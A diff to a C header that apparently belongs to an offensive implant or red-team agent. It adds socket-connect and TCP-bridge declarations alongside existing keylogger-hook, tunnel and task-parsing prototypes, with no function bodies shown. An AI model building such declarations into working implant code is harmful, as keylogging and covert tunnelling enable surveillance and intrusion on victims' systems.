@@ -134,14 +134,24 @@ void keymon(session *striker, task *tsk);
   LRESULT CALLBACK keymon_hook_proc(int nCode, WPARAM wParam, LPARAM lParam);
 #endif
 
+// Connect to a TCP sockect and return the socket object.
+#ifdef IS_LINUX
+  int tcp_connect(char *host, int port);
+#else
+  SOCKET tcp_connect(char *host, int port);
+#endif
+
 // Starts a TCP tunnel server.
 int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport);
 
-// Create a TCP tunnel for a new connection.
 #ifdef IS_LINUX
+  // Create a TCP tunnel for a new connection.
   void *tcp_tunnel_route(void *ptr);
 #endif
-  
+
+// Create a TCP bridge between two servers
+void tcp_bridge(session *striker, task *tsk, char *host1, int port1, char *host2, int port2);
+
 // Parse a task JSON and return it, NULL on error.
 task *parse_task(cJSON *json);
 
